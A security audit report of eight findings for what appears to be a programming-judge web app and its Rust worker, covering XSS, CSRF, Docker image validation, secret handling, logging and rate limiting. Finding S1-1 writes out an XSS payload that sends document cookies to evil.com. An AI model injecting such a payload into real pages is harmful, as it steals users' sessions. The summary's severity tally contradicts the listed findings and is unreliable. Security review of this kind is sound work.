# Cycle 1 Security Review

Date: 2026-06-24
Reviewer: Direct analysis

## Findings

### S1-1 — Medium — XSS via `dangerouslySetInnerHTML` in ProblemDescription component

**Location:** `src/components/problem-description.tsx:67`

**Issue:** The component renders user-controlled problem descriptions using `dangerouslySetInnerHTML` when `looksLikeLegacyHtml` is true. While `sanitizeHtml` is applied, the security of this path depends entirely on the implementation of `@/lib/security/sanitize-html`. If that function does not strictly allowlist tags and strip event handlers, a malicious problem description could execute JavaScript.

**Attack scenario:** An admin with problem-editing privileges (or via a compromised account) inserts a crafted description like `<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>` into a problem. When students view the problem, their session cookies are exfiltrated.

**Confidence:** Medium

**Fix:** Audit `sanitizeHtml` to ensure it strips all event handlers and `javascript:` URLs. Add automated tests for XSS payloads. Consider using DOMPurify with a strict configuration.

---

### S1-2 — Low — `validateCsrf` relies solely on `X-Requested-With` header for CSRF protection

**Location:** `src/lib/security/csrf.ts:30-74`

**Issue:** The CSRF protection requires `X-Requested-With: XMLHttpRequest` for all mutation methods. While this is effective against simple form submissions (which cannot set custom headers), it does not protect against cross-origin requests from other JavaScript contexts that can set this header (e.g., same-site subdomains, browser extensions, or compromised same-origin scripts).

**Attack scenario:** A compromised subdomain or browser extension could set `X-Requested-With: XMLHttpRequest` and make authenticated POST requests to the API.

**Confidence:** Low (requires same-site compromise)

**Fix:** Consider adding a SameSite cookie attribute (already likely set by NextAuth) and/or a double-submit cookie pattern for additional defense in depth.

---

### S1-3 — Medium — `validate_docker_image` bypass when no trusted registries configured

**Location:** `judge-worker-rs/src/validation.rs:52-61`

**Issue:** When `TRUSTED_DOCKER_REGISTRIES` is empty or unset, images without registry prefixes (e.g., `judge-python:latest`) pass validation. In production, if an operator forgets to set `TRUSTED_DOCKER_REGISTRIES`, the worker could pull arbitrary images from Docker Hub.

**Attack scenario:** An attacker with admin access configures a problem to use `judge-python-evil:latest` (if it exists on Docker Hub) and the worker would execute it.

**Confidence:** Medium

**Fix:** In production mode, require `TRUSTED_DOCKER_REGISTRIES` to be non-empty. Reject images without a trusted registry prefix when in production.

---

### S1-4 — Low — `report_with_retry` dead-letter file names include raw submission IDs

**Location:** `judge-worker-rs/src/executor.rs:1034-1039`

**Issue:** Dead-letter filenames are constructed as `{safe_id}-{timestamp}.json` where `safe_id` is the submission ID filtered for alphanumeric/hyphen/underscore. While the ID itself is not sensitive, it could leak information about submission volumes or patterns if the dead-letter directory is accessible.

**Confidence:** Low

**Fix:** Ensure the dead-letter directory has strict permissions (0o700) and is not accessible outside the worker process.

---

### S1-5 — Medium — `encryptPluginSecret` uses `deriveEncryptionKey` which may use a static secret

**Location:** `src/lib/plugins/secrets.ts:36-50`

**Issue:** The encryption key is derived from `deriveEncryptionKey(PLUGIN_DOMAIN)`. If this function derives from a static environment variable that is not rotated, a database breach could allow offline decryption of plugin secrets. The function also falls back to `legacyEncryptionKey()` for backward compatibility.

**Confidence:** Medium

**Fix:** Document the key derivation source and ensure the master secret is rotated periodically. Consider adding key versioning to the encryption format.

---

### S1-6 — Low — `createApiHandler` error handler logs full error details including potentially sensitive data

**Location:** `src/lib/api/handler.ts:204-205`

**Issue:** The error handler logs `error` with `logger.error({ err: error, method: req.method, path: req.nextUrl.pathname }, "Unhandled error")`. If the error object contains sensitive data (e.g., from a database query error), it could be logged to persistent storage.

**Confidence:** Low

**Fix:** Sanitize error objects before logging, or use a structured error serializer that redacts known sensitive fields.

---

### S1-7 — Medium — `getApiUser` API key authentication does not rate-limit failed attempts

**Location:** `src/lib/api/auth.ts:61-83`

**Issue:** The API key authentication path (`Bearer jk_...`) does not have rate limiting for failed authentication attempts. An attacker could brute-force API keys without throttling.

**Confidence:** Medium

**Fix:** Add rate limiting specifically for API key authentication failures, or use the existing `consumeApiRateLimit` mechanism for the auth endpoint.

---

### S1-8 — Low — `startSensitiveDataPruning` stores timer reference in global scope

**Location:** `src/lib/data-retention-maintenance.ts:166-178`

**Issue:** The pruning timer is stored in `globalThis.__sensitiveDataPruneTimer`, which could be accessed or tampered with by other code in the same process. While this is a Node.js server process (not a browser), it's still an unnecessary exposure.

**Confidence:** Low

**Fix:** Use a module-level private variable instead of a global variable.

---

## Summary

Total findings: 8
- Medium severity: 5
- Low severity: 3

Most critical: S1-1 (XSS), S1-3 (Docker image validation bypass), S1-5 (encryption key derivation)
